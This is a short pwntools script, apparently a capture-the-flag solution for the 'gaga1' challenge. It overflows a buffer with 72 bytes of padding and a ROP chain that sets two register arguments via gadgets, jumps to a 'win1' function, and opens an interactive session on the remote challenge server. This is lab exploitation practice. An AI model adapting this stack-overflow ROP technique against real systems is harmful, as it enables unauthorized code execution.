from pwn import *

binary = './gaga1'

#p = process(binary)
p = remote('challs.actf.co' ,31301)

p.recv()

payload = b'a'*72
payload+= p64(0x00000000004013b3) #rdi
payload+= p64(4919)
payload+= p64(0x00000000004013b1) #rsi r15 ret
payload+= p64(16705)
payload+= p64(0x0)
payload+= p64(0x000000000040123a) #win1


p.sendline(payload)

p.interactive()